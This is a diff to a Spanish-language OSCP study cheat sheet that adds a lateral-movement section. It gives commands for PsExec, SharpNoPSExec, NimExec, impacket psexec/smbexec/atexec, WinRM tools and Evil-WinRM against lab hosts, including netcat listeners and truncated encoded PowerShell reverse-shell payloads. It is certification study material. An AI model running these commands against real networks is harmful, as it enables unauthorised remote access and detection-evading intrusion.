@@ -1,6 +1,6 @@
 ![alt=OSCP](./img/oscp-banner.png)
 
-# OSCP CheetSheet
+# OSCP (Offensive Security Certified Professional) CheetSheet
 Apuntes para la certicación OSCP.
 
 # Tabla de Contenido
@@ -83,15 +83,30 @@ Apuntes para la certicación OSCP.
     * 7.1. [Windows](#windows-1)
     * 7.2. [Linux](#linux)
 * 8. [Movimiento Lateral](#movimiento-lateral)
-    * 8.1. [Windows](#windows-2)
-    * 8.2. [Linux](#linux-1)
+    * 8.1. [RDP](#rdp)
+        * 8.1.1. [xfreerdp](#xfreerdp-1)
+    * 8.2. [SMB](#smb)
+        * 8.2.1. [PsExec](#psexec)
+        * 8.2.2. [SharpNoPSExec](#sharpnopsexec)
+        * 8.2.3. [NimExec](#nimexec)
+        * 8.2.4. [psexec.py](#psexec.py)
+        * 8.2.5. [smbexec.py](#smbexec.py)
+        * 8.2.6. [atexec.py](#atexec.py)
+    * 8.3. [WinRM](#winrm)
+        * 8.3.1. [Invoke-Command](#invoke-command)
+        * 8.3.2. [WINRS](#winrs)
+        * 8.3.3. [Enter-PSSession](#enter-pssession)
+        * 8.3.4. [NetExec](#netexec-4)
+        * 8.3.5. [Evil-WinRM](#evil-winrm)
+    * 8.4. [WMI](#wmi)
 * 9. [Escalación de Privilegios](#escalación-de-privilegios)
-    * 9.1. [Windows](#windows-3)
+    * 9.1. [Windows](#windows-2)
         * 9.1.1. [Enumeración](#enumeración-1)
         * 9.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
-    * 9.2. [Linux](#linux-2)
+    * 9.2. [Linux](#linux-1)
 * 10. [Active Directory](#active-directory)
-    * 10.1. [Enumeración](#enumeración-2)
+    * 10.1. [Escalación de privilegios](#escalación-de-privilegios-2)
+        * 10.1.1. [Grupos Privilegiados](#grupos-privilegiados)
     * 10.2. [Kerberos](#kerberos)
     * 10.3. [Explotación](#explotación)
     * 10.4. [Movimiento Lateral](#movimiento-lateral-1)
@@ -103,7 +118,7 @@ Apuntes para la certicación OSCP.
     * 11.4. [Bases de datos](#bases-de-datos)
     * 11.5. [Passwords Attacks](#passwords-attacks-1)
     * 11.6. [Wordlists](#wordlists)
-    * 11.7. [Escalación de Privilegios](#escalación-de-privilegios-2)
+    * 11.7. [Escalación de Privilegios](#escalación-de-privilegios-3)
     * 11.8. [Recursos y Blogs](#recursos-y-blogs)
 
 <!-- vscode-markdown-toc-config
@@ -1077,13 +1092,185 @@ Diferentes utilidades para las operaciones de transferencia de archivos en Linux
 
 ##  8. <a name='movimiento-lateral'></a>Movimiento Lateral
 
-###  8.1. <a name='windows-2'></a>Windows
+###  8.1. <a name='rdp'></a>RDP
 
-###  8.2. <a name='linux-1'></a>Linux
+####  8.1.1. <a name='xfreerdp-1'></a>xfreerdp
+
+```bash
+xfreerdp /u:'<USER>' /p:'<PASSWORD>' /d:inlanefreight.local /v:192.168.56.10 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
+```
+
+Parámetros:
+
+- `/bpp:8`: Reduce la profundidad del color a 8 bits por píxel, disminuyendo la cantidad de datos transmitidos.
+- `/compression`: Habilita la compresión para reducir la cantidad de datos enviados a través de la red.
+- `-themes`: Desactiva los temas del escritorio para reducir los datos gráficos.
+- `-wallpaper`: Desactiva el fondo de pantalla del escritorio para reducir aún más los datos gráficos.
+- `/clipboard`: permite compartir el portapapeles entre las máquinas locales y remotas.
+- `/audio-mode:0`: Desactiva la redirección de audio para ahorrar ancho de banda.
+- `/auto-reconnect`: Se vuelve a conectar automáticamente si la conexión se interrumpe, lo que mejora la estabilidad de la sesión.
+- `-glyph-cache`: permite el almacenamiento en caché de glifos (caracteres de texto) para reducir la cantidad de datos enviados para la representación de texto.
+
+###  8.2. <a name='smb'></a>SMB
+
+####  8.2.1. <a name='psexec'></a>PsExec
+
+[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) está incluido en el conjunto de herramientas Sysinternals de Microsoft, una colección de herramientas diseñadas para ayudar a los administradores en tareas de gestión del sistema. Esta herramienta facilita la ejecución remota de comandos y recupera la salida a través de un pipe con nombre utilizando el protocolo SMB, operando en el puerto TCP 445 y el puerto TCP 139.
+
+```powershell
+.\PsExec.exe \\MS02 -i -u HACKLAB.LOCAL\elliot -p Password123 cmd
+```
+####  8.2.2. <a name='sharpnopsexec'></a>SharpNoPSExec
+
+[SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) es una herramienta diseñada para facilitar el movimiento lateral aprovechando los servicios existentes en un sistema de destino sin crear otros nuevos ni escribir en el disco, minimizando así el riesgo de detección. La herramienta consulta todos los servicios en la máquina de destino, identificando aquellos con un tipo de inicio configurado como deshabilitado o manual, estado actual de detenido y ejecutándose con privilegios de LocalSystem. Selecciona aleatoriamente uno de estos servicios y modifica temporalmente su ruta binaria para apuntar a una carga útil elegida por el atacante. Tras la ejecución, `SharpNoPSExec` espera aproximadamente 5 segundos antes de restaurar la configuración original del servicio, devolviendo el servicio a su estado anterior. Este enfoque no solo proporciona un shell, sino que también evita la creación de nuevos servicios, lo que podría ser detectado por los sistemas de monitoreo de seguridad.
+
+Nos ponemos en escucha con Netcat
+
+```bash
+rlwrap nc -lnvp 4444
+```
+
+Ejecutamos `SharpNoPSExec`
+
+```powershell
+.\SharpNoPSExec.exe --target=192.168.56.10 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="
+```
+
+> Creamos un shell en [revshells.com](https://www.revshells.com/)
+
+####  8.2.3. <a name='nimexec'></a>NimExec
+
+[NimExec](https://github.com/frkngksl/NimExec) es una herramienta de ejecución remota de comandos sin archivos que utiliza el Protocolo de Control de Servicios Remotos (MS-SCMR). Manipula la ruta binaria de un servicio con privilegios de LocalSystem para ejecutar comandos en la máquina objetivo y luego restaura la configuración original. Funciona enviando paquetes RPC personalizados a través de SMB y el pipe svcctl, autenticándose mediante un hash NTLM. Al evitar funciones específicas del sistema operativo y aprovechar la compilación cruzada de Nim, NimExec es compatible con múltiples sistemas operativos, ofreciendo una solución versátil y eficiente.
+
+Nos ponemos en escucha con Netcat
+
+```bash
+rlwrap nc -lnvp 4444
+```
+
+Ejecutamos NimExec
+
+```powershell
+.\NimExec -u <user> -d hacklab.local -p <password> -t 192.168.56.10 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v
+```
+
+####  8.2.4. <a name='psexec.py'></a>psexec.py
+
+```bash
+impacket-psexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
+```
+
+####  8.2.5. <a name='smbexec.py'></a>smbexec.py
+
+```bash
+impacket-smbexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10
+```
+
+####  8.2.6. <a name='atexec.py'></a>atexec.py
+
+El [script atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py) utiliza el servicio Programador de tareas de Windows, al que se puede acceder a través de la tubería SMB `atsvc`. Nos permite agregar de forma remota una tarea al programador, que se ejecutará en el momento designado.
+
+Con esta herramienta, la salida del comando se envía a un archivo, al que posteriormente se accede a través del recurso compartido `ADMIN$`. Para que esta utilidad sea efectiva, es esencial sincronizar los relojes de la computadora atacante y de la computadora objetivo al minuto exacto.
+
+Podemos aprovechar esta herramienta insertando un reverse shell en el host de destino.
+
+Nos ponemos en escucha con Netcat
+
+```bash
+rlwrap nc -lnvp 4444
+```
+
+Ahora pasemos el nombre de dominio, el usuario administrador, la contraseña y la dirección IP de destino. `<domain>/<user>:<password>@<ip>`y, por último, podemos pasar nuestro payload de reverse shell para que se ejecute.
+
+```bash
+impacket-atexec HACKLAB.LOCAL/<USER>:'<PASSWORD>'@192.168.56.10 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
+```
+
+###  8.3. <a name='winrm'></a>WinRM
+
+[Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) es la versión de Microsoft del [protocolo WS-Management (Web Services-Management)](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) , un protocolo estándar para administrar software y hardware de forma remota. WinRM facilita la transferencia de datos de administración entre computadoras, lo que permite a los administradores realizar una variedad de tareas, como ejecutar scripts y recuperar datos de eventos de sistemas remotos.
+
+WinRM se usa comúnmente junto con PowerShell con fines administrativos y de automatización, lo que lo convierte en una herramienta indispensable para administrar entornos Windows. Proporciona un método seguro y eficiente para interactuar con sistemas remotos, aprovechando los estándares web establecidos para garantizar la compatibilidad y la flexibilidad. La comunicación WinRM utiliza principalmente el puerto TCP `5985` para HTTP y `5986` para HTTPS.
+
+```bash
+netexec winrm 192.168.56.10 -u <user> -p <password>
+```
+####  8.3.1. <a name='invoke-command'></a>Invoke-Command
+Podemos usar PowerShell para interactuar con WinRM en Windows, PowerShell tiene cmdlets como [Invoke-Command](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4) y [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4) para administrar y ejecutar comandos en sistemas remotos.
+
+```powershell
+ Invoke-Command -ComputerName MS02 -ScriptBlock { hostname;whoami }
+```
+
+Además, podemos especificar credenciales con el parámetro `-Credential`:
+
+```powershell
+PS C:\Tools> $username = "HACKLAB.LOCAL\elliot"
+PS C:\Tools> $password = "Password123"
+PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+PS C:\Tools> Invoke-Command -ComputerName 192.168.56.10 -Credential $credential -ScriptBlock { whoami; hostname }
+hacklab.local\elliot
+DC01
+```
+
+> Si usamos la IP en lugar del nombre de la computadora, debemos usar credenciales explícitas o, alternativamente, podemos usar la bandera `-Authentication Negotiate` en lugar de proporcionar credenciales explícitas.
+
+####  8.3.2. <a name='winrs'></a>WINRS
+
+[winrs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell) es una herramienta de línea de comandos que permite ejecutar comandos en una máquina con Windows utilizando WinRM de forma remota. A continuación se muestra un ejemplo de cómo utilizar `winrs` para ejecutar un comando en un servidor remoto:
+
+```powershell-session
+PS C:\Tools> winrs -r:MS02 "powershell -c whoami;hostname"
+hacklab.local\elliot
+DC01
+```
+
+`winrs` también nos permite usar credenciales explícitas con las opciones `/username:<username>` y `/password:<password>` así:
+
+```powershell
+PS C:\Tools> winrs /remote:MS02 /username:elliot /password:Password123 "powershell -c whoami;hostname"
+hacklab.local\elliot
+DC01
+```
+
+####  8.3.3. <a name='enter-pssession'></a>Enter-PSSession
+
+Podemos usar el Cmdlet `Enter-PSSession` para un shell interactivo usando PowerShell Remoting. Este cmdlet nos permite iniciar una sesión interactiva con la computadora remota, ya sea utilizando una sesión creada con `New-PSSession`, especificando credenciales explícitas, o aprovechando la sesión actual donde se ejecuta el comando. Por ejemplo, reutilicemos el `$sessionSRV02` variable que creamos anteriormente. Especificando el `Enter-PSSession` y la variable nos dará un mensaje interactivo de PowerShell en la computadora remota, lo que nos permite ejecutar comandos como si nos registraran directamente.
+
+```powershell
+PS C:\Temp> $username = "HACKLAB.LOCAL\elliot"
+PS C:\Temp> $password = "Password123"
+PS C:\Temp> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Temp> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+PS C:\Temp> $sessionMS02 = New-PSSession -ComputerName SRV02 -Credential $credential
+PS C:\Temp> Enter-PSSession $sessionMS02
+[MS02]: PS C:\Users\elliot\Documents>
+```
+
+####  8.3.4. <a name='netexec-4'></a>NetExec
+
+Con `NetExec` podemos usar la opción `-x` para ejecutar comandos CMD o PowerShell. Por ejemplo, para ejecutar un comando básico como `ipconfig` podemos usar el siguiente comando:
+
+```shell
+netexec winrm 192.168.56.10 -u elliot -p Password123 -x "ipconfig"
+```
+
+####  8.3.5. <a name='evil-winrm'></a>Evil-WinRM
+
+[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) es una herramienta basada en Ruby que facilita la interacción con WinRM desde Linux. Ofrece una interfaz sencilla para ejecutar comandos y administrar sistemas Windows de forma remota.
+
+Una vez instalado, podemos usar `evil-winrm` para conectarse a una máquina Windows remota y ejecutar comandos. Debemos especificar la opción. `-i <target>` y las credenciales con las opciones `-u '<domain>\<user>'` para usuarios y para contraseña `-p <password>`:
+
+```bash
+evil-winrm -i 192.168.56.10 -u elliot -p Password123
+```
+
+###  8.4. <a name='wmi'></a>WMI
 
 ##  9. <a name='escalación-de-privilegios'></a>Escalación de Privilegios
 
-###  9.1. <a name='windows-3'></a>Windows
+###  9.1. <a name='windows-2'></a>Windows
 
 ####  9.1.1. <a name='enumeración-1'></a>Enumeración
 
@@ -2227,13 +2414,13 @@ También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad
 
     Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.
 
-###  9.2. <a name='linux-2'></a>Linux
+###  9.2. <a name='linux-1'></a>Linux
 
 ##  10. <a name='active-directory'></a>Active Directory
 
-### Escalación de privilegios
+###  10.1. <a name='escalación-de-privilegios-2'></a>Escalación de privilegios
 
-#### Grupos Privilegiados
+####  10.1.1. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
 ##### Account Operators
 ##### Server Operators
@@ -2317,7 +2504,7 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-###  11.7. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
+###  11.7. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
 
 
 | Nombre   | URL                                                      |
